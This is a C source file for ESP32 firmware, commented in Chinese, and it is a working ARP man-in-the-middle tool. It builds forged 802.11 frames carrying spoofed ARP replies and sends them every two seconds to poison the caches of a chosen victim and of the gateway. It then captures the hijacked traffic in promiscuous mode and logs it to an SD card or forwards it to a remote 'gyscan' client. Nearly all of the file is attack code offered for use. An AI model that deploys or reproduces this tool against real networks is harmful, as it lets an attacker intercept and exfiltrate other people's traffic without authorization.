/*
 * arp_mitm.c - ARP 中间人(ARP MITM)攻击 + 抓包/存储/转发
 *
 * 原理：
 *   1) 注入：在 STA(WiFi 客户端) 网卡上用 esp_wifi_80211_tx 注入伪造的
 *      802.11 数据帧(内层为 ARP 应答)，周期性向受害主机与网关声明
 *      “对方 IP 在 ESP 的 MAC”，毒化双方 ARP 缓存，使被劫持流量经过 ESP。
 *      （开放网络有效；WPA2 下 AP 不转发未加密注入帧，注入为尽力而为。）
 *   2) 抓包：启用混杂模式(esp_wifi_set_promiscuous)接收 AP 转发给本机
 *      (ESP 的 MAC)的数据帧。WPA2 网络中 AP 会解密后转发到 ESP，ESP 收到
 *      的即是被劫持的明文数据，因此抓包在 WPA2 下同样可用。
 *   3) 数据路由：
 *        - 已挂载可用 TF 卡：抓到的数据包写入 /sdcard/arp_capture.log；
 *        - 未挂载 TF 卡：默认不写入 Flash，改为打印到串口，且当有 gyscan
 *          客户端连接时同步把抓包数据转发回 gyscan 远程打印/保存。
 */

#include "arp_mitm.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "lwip/ip4_addr.h"
#include "sdcard.h"
#include "tcp_server.h"

static const char *TAG = "arp_mitm";

#define ARP_REPOISON_INTERVAL_MS 2000
#define ARP_HW_ETHERNET          0x0001
#define ARP_PROTO_IPV4           0x0800
#define ARP_OP_REPLY             0x0002

/* 单包抓取快照长度(字节)：足够覆盖以太网头+IP头，控制输出体积 */
#define CAPTURE_SNAP_LEN  128
#define CAPTURE_QUEUE_LEN 8

/* TF 卡上的抓包文件（仅在 TF 挂载时写入，默认写 Flash） */
#define CAPTURE_FILE "/sdcard/arp_capture.log"

typedef struct {
    uint32_t target_ip;    /* 受害主机 IP(网络字节序) */
    uint32_t gateway_ip;   /* 网关 IP(网络字节序) */
} mitm_cfg_t;

/* 一帧捕获记录（由混杂回调填充，抓包任务消费后 free） */
typedef struct {
    uint32_t ts_ms;        /* 捕获时刻(毫秒) */
    uint16_t frame_len;    /* 802.11 帧总长 */
    uint16_t ethertype;    /* 内层 EtherType，未知为 0 */
    uint8_t  src[6];       /* 802.11 源 MAC */
    uint8_t  dst[6];       /* 802.11 目的 MAC */
    uint16_t data_len;     /* 实际拷贝的内层字节数 */
    uint8_t  data[CAPTURE_SNAP_LEN];
} arp_capture_t;

static TaskHandle_t s_task = NULL;          /* 注入任务 */
static TaskHandle_t s_capture_task = NULL;  /* 抓包消费任务 */
static QueueHandle_t s_capture_queue = NULL;
static volatile bool s_running = false;
static mitm_cfg_t s_cfg;

/* ---------- IP 工具 ---------- */

static bool parse_ip(const char *str, uint32_t *out)
{
    if (str == NULL || *str == '\0') {
        return false;
    }
    ip4_addr_t a;
    if (ip4addr_aton(str, &a)) {
        *out = a.addr;
        return true;
    }
    return false;
}

static void ip_to_str(uint32_t ip, char *buf, size_t sz)
{
    snprintf(buf, sz, "%u.%u.%u.%u",
             (unsigned)(ip & 0xff), (unsigned)((ip >> 8) & 0xff),
             (unsigned)((ip >> 16) & 0xff), (unsigned)((ip >> 24) & 0xff));
}

static void mac_to_str(const uint8_t mac[6], char *buf, size_t sz)
{
    snprintf(buf, sz, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

/* ---------- ARP 注入 ---------- */

static bool get_sta_mac(uint8_t mac[6])
{
    return esp_wifi_get_mac(WIFI_IF_STA, mac) == ESP_OK;
}

static bool get_ap_bssid(uint8_t bssid[6])
{
    wifi_ap_record_t ap = {0};
    if (esp_wifi_sta_get_ap_info(&ap) != ESP_OK) {
        return false;
    }
    memcpy(bssid, ap.bssid, 6);
    return true;
}

static void fill_11n_header(uint8_t *hdr, const uint8_t da[6],
                            const uint8_t sa[6], const uint8_t bssid[6])
{
    hdr[0] = 0x08; hdr[1] = 0x01;            /* Frame Control: Data, ToDS */
    hdr[2] = 0x00; hdr[3] = 0x00;            /* Duration */
    memcpy(hdr + 4, da, 6);                  /* Address1 = DA(AP BSSID) */
    memcpy(hdr + 10, sa, 6);                 /* Address2 = SA(ESP MAC) */
    memcpy(hdr + 16, bssid, 6);              /* Address3 = BSSID */
    hdr[22] = 0x00; hdr[23] = 0x00;          /* Sequence: 由驱动填充 */
}

static void fill_llc_snap(uint8_t *l, uint16_t ethertype)
{
    l[0] = 0xAA; l[1] = 0xAA; l[2] = 0x03;
    l[3] = 0x00; l[4] = 0x00; l[5] = 0x00;
    l[6] = (uint8_t)(ethertype >> 8);
    l[7] = (uint8_t)(ethertype & 0xff);
}

static size_t build_arp_frame(uint8_t *out, const uint8_t src_mac[6],
                              uint32_t sender_ip, uint32_t target_ip)
{
    uint8_t bc[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
    size_t o = 0;
    memcpy(out + o, bc, 6);     o += 6;
    memcpy(out + o, src_mac, 6); o += 6;
    out[o++] = 0x08; out[o++] = 0x06;        /* EtherType ARP */

    out[o++] = 0x00; out[o++] = ARP_HW_ETHERNET;
    out[o++] = 0x08; out[o++] = 0x00;
    out[o++] = 0x06; out[o++] = 0x04;
    out[o++] = 0x00; out[o++] = ARP_OP_REPLY;
    memcpy(out + o, src_mac, 6); o += 6;
    memcpy(out + o, &sender_ip, 4); o += 4;
    memcpy(out + o, bc, 6); o += 6;
    memcpy(out + o, &target_ip, 4); o += 4;
    return o;
}

static esp_err_t send_arp_reply(uint32_t spoofed_ip, uint32_t victim_ip)
{
    uint8_t my_mac[6], bssid[6];
    if (!get_sta_mac(my_mac) || !get_ap_bssid(bssid)) {
        return ESP_ERR_INVALID_STATE;
    }

    uint8_t frame[256];
    memset(frame, 0, sizeof(frame));
    fill_11n_header(frame, bssid, my_mac, bssid);
    fill_llc_snap(frame + 24, 0x0806);

    size_t eth_len = build_arp_frame(frame + 32, my_mac, spoofed_ip, victim_ip);
    int total = 32 + (int)eth_len;

    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, total, true);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "注入 ARP 帧失败: %s", esp_err_to_name(ret));
    }
    return ret;
}

/* ---------- 混杂抓包 ---------- */

/*
 * 混杂模式接收回调(在 WiFi RX 任务上下文运行，需快速返回)。
 * 只关心 DATA 帧；解析 802.11 头后把内层字节快照拷贝到堆缓冲，
 * 经队列交给抓包任务做格式化与路由。
 */
static void promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_running || type != WIFI_PKT_DATA || buf == NULL ||
        s_capture_queue == NULL) {
        return;
    }
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint16_t sig_len = pkt->rx_ctrl.sig_len;
    if (sig_len < 24) {
        return;
    }

    const uint8_t *f = pkt->payload;
    uint16_t fc = f[0] | (f[1] << 8);
    /* 只处理 Data 类型(type=2) */
    if (((fc >> 2) & 0x3) != 2) {
        return;
    }
    int hdrlen = 24;
    if ((fc >> 4) & 0x08) {   /* QoS Data */
        hdrlen = 26;
    }
    if (sig_len <= (uint16_t)hdrlen) {
        return;
    }
    uint16_t body = sig_len - (uint16_t)hdrlen;   /* 实际帧体长度 */

    /* 记录源/目的 MAC：Data 帧 Address2=SA, Address1=DA */
    uint8_t src[6], dst[6];
    memcpy(dst, f + 4, 6);
    memcpy(src, f + 10, 6);

    /* 解析 LLC/SNAP 以太网类型（body >= 8 时） */
    uint16_t ethertype = 0;
    if (body >= 8) {
        ethertype = (uint16_t)((f[hdrlen + 6] << 8) | f[hdrlen + 7]);
    }

    /* 拷贝内层负载快照(从 LLC/SNAP 起) */
    uint16_t copy = body > CAPTURE_SNAP_LEN ? CAPTURE_SNAP_LEN : body;
    arp_capture_t *cap = (arp_capture_t *)malloc(sizeof(arp_capture_t));
    if (cap == NULL) {
        return;
    }
    cap->ts_ms = (uint32_t)(esp_timer_get_time() / 1000);
    cap->frame_len = sig_len;
    cap->ethertype = ethertype;
    memcpy(cap->src, src, 6);
    memcpy(cap->dst, dst, 6);
    cap->data_len = copy;
    if (copy > 0) {
        memcpy(cap->data, f + hdrlen, copy);
    }

    if (xQueueSend(s_capture_queue, &cap, 0) != pdTRUE) {
        free(cap);
    }
}

/* 把一帧捕获记录格式化为单行文本 */
static void format_capture(const arp_capture_t *cap, char *out, size_t out_sz)
{
    char s[20], d[20];
    mac_to_str(cap->src, s, sizeof(s));
    mac_to_str(cap->dst, d, sizeof(d));

    size_t o = 0;
    o += (size_t)snprintf(out + o, out_sz - o,
                          "[%ums] %s -> %s eth=0x%04x len=%u data=",
                          (unsigned)cap->ts_ms, s, d, (unsigned)cap->ethertype,
                          (unsigned)cap->data_len);
    for (uint16_t i = 0; i < cap->data_len && o + 3 < out_sz; i++) {
        o += (size_t)snprintf(out + o, out_sz - o, "%02x", cap->data[i]);
    }
    if (o < out_sz) {
        out[o] = '\0';
    }
}

/* 写一行到 TF 卡抓包文件（仅在 TF 挂载时调用） */
static void write_to_tf(const char *line)
{
    if (!sdcard_is_mounted()) {
        return;
    }
    FILE *f = fopen(CAPTURE_FILE, "a");
    if (f == NULL) {
        ESP_LOGW(TAG, "无法打开 TF 卡抓包文件");
        return;
    }
    fprintf(f, "%s\n", line);
    fclose(f);
}

/* 抓包消费任务：从队列取出记录，格式化后路由到 TF 卡 / 串口 / gyscan */
static void capture_task(void *arg)
{
    (void)arg;
    ESP_LOGI(TAG, "ARP 抓包任务启动 (存储: %s)",
             sdcard_is_mounted() ? "TF卡 /sdcard/arp_capture.log" : "串口/远程gyscan");

    while (s_running) {
        arp_capture_t *cap = NULL;
        if (xQueueReceive(s_capture_queue, &cap, pdMS_TO_TICKS(200)) != pdTRUE) {
            continue;
        }
        if (cap == NULL) {
            continue;
        }

        char line[CAPTURE_SNAP_LEN * 2 + 96];
        format_capture(cap, line, sizeof(line));

        if (sdcard_is_mounted()) {
            /* 已挂载可用 TF 卡：只写卡，不向 Flash 写入 */
            write_to_tf(line);
        } else {
            /* 未挂载：打印到串口；有 gyscan 连接则远程转发 */
            printf("%s\n", line);
            if (tcp_server_client_count() > 0) {
                tcp_server_arp_forward(line);
            }
        }
        free(cap);
    }

    ESP_LOGI(TAG, "ARP 抓包任务退出");
    s_capture_task = NULL;
    vTaskDelete(NULL);
}

/* ---------- 注入任务 ---------- */

static void mitm_task(void *arg)
{
    (void)arg;
    char t[16], g[16];
    ip_to_str(s_cfg.target_ip, t, sizeof(t));
    ip_to_str(s_cfg.gateway_ip, g, sizeof(g));
    ESP_LOGI(TAG, "ARP MITM 启动: %s <-> %s", t, g);

    while (s_running) {
        send_arp_reply(s_cfg.gateway_ip, s_cfg.target_ip);
        send_arp_reply(s_cfg.target_ip, s_cfg.gateway_ip);
        vTaskDelay(pdMS_TO_TICKS(ARP_REPOISON_INTERVAL_MS));
    }

    ESP_LOGI(TAG, "ARP MITM 注入已停止");
    s_task = NULL;
    vTaskDelete(NULL);
}

/* ---------- 对外接口 ---------- */

esp_err_t arp_mitm_start(const char *target_ip, const char *gateway_ip)
{
    if (s_running) {
        return ESP_OK;
    }
    if (!parse_ip(target_ip, &s_cfg.target_ip) ||
        !parse_ip(gateway_ip, &s_cfg.gateway_ip)) {
        return ESP_ERR_INVALID_ARG;
    }
    if (s_cfg.target_ip == 0 || s_cfg.gateway_ip == 0 ||
        s_cfg.target_ip == s_cfg.gateway_ip) {
        return ESP_ERR_INVALID_ARG;
    }

    s_running = true;
    esp_wifi_set_ps(WIFI_PS_NONE);

    /* 初始化抓包队列 */
    if (s_capture_queue == NULL) {
        s_capture_queue = xQueueCreate(CAPTURE_QUEUE_LEN, sizeof(arp_capture_t *));
    }

    /* 开启混杂模式抓包(接收被劫持流量) */
    esp_wifi_set_promiscuous_rx_cb(promisc_rx_cb);
    wifi_promiscuous_filter_t flt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&flt);
    esp_wifi_set_promiscuous(true);

    BaseType_t r = xTaskCreate(mitm_task, "arp_mitm", 4096, NULL, 6, &s_task);
    if (r != pdPASS) {
        goto fail;
    }
    r = xTaskCreate(capture_task, "arp_cap", 4096, NULL, 5, &s_capture_task);
    if (r != pdPASS) {
        goto fail;
    }
    return ESP_OK;

fail:
    s_running = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
    return ESP_FAIL;
}

esp_err_t arp_mitm_stop(void)
{
    if (!s_running) {
        return ESP_OK;
    }
    s_running = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    while (s_task != NULL || s_capture_task != NULL) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (s_capture_queue != NULL) {
        /* 清空残留记录 */
        arp_capture_t *cap = NULL;
        while (xQueueReceive(s_capture_queue, &cap, 0) == pdTRUE) {
            if (cap != NULL) {
                free(cap);
            }
        }
    }
    return ESP_OK;
}

bool arp_mitm_is_running(void)
{
    return s_running;
}

void arp_mitm_status_text(char *buf, size_t buf_sz)
{
    if (buf == NULL || buf_sz == 0) {
        return;
    }
    if (!s_running) {
        snprintf(buf, buf_sz, "%s", "未启动");
        return;
    }
    char t[16], g[16];
    ip_to_str(s_cfg.target_ip, t, sizeof(t));
    ip_to_str(s_cfg.gateway_ip, g, sizeof(g));
    snprintf(buf, buf_sz, "%s <-> %s (%s)", t, g,
             sdcard_is_mounted() ? "TF卡存储" : "串口/远程gyscan打印");
}
